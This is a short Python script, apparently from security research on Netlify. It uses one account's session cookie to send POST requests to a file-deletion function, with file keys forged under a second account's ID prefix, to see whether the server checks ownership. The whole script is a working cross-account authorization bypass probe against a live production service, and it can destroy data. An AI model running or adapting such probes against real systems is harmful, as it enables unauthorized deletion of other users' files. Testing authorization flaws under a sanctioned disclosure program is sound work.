# -*- coding: utf-8 -*-
"""Netlify:delete URL 生成的 fileKey 校验矩阵(cookie=B, acc=B)
测 fileKey 前缀是否必须属于 accountId(伪造 A 前缀 key)"""
import http.client, ssl, json, sys, time
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_B
ctx = ssl.create_default_context()

ACC_A_UUID = '6a979dd2ae93f47d55b62897'
ACC_B_UUID = '6a97b6454fef0db964f75db6'

def req(path, cookie=COOKIE_B):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=25)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0',
         'Accept': 'application/json', 'Cookie': cookie, 'Origin': 'https://app.netlify.com'}
    conn.request('POST', path, headers=h)
    r = conn.getresponse(); raw = r.read()
    st = r.status; conn.close()
    return st, raw[:300].decode('utf-8', 'replace')

KEYS = [
    # B 自己的真实 key 前缀 + 伪造深层
    ('B-real-prefix', 'user-uploaded-content/%s/%s/x.txt' % (ACC_B_UUID, '11111111-1111-4111-8111-111111111111')),
    ('A-prefix-fake', 'user-uploaded-content/%s/%s/x.txt' % (ACC_A_UUID, '11111111-1111-4111-8111-111111111111')),
    ('A-prefix-real-uuid', 'user-uploaded-content/%s/%s/x.txt' % (ACC_A_UUID, 'cc869311-9e43-420a-bb24-589fe47014b0')),
    # 无前缀/其他前缀
    ('no-prefix', 'x.txt'),
    ('other-prefix', 'other/xxx.txt'),
    # 真实存在过的 B key(已删,测试已删 key 的响应)
    ('B-deleted-key', 'user-uploaded-content/%s/%s/ar-xdel-1788419870.txt' % (ACC_B_UUID, 'cc869311-9e43-420a-bb24-589fe47014b0')),
]
for tag, k in KEYS:
    p = '/.netlify/functions/agent-runner-file-delete?accountId=%s&fileKey=%s' % (ACC_B_UUID, k)
    s, b = req(p)
    print('%-18s -> %d %s' % (tag, s, b[:200]))
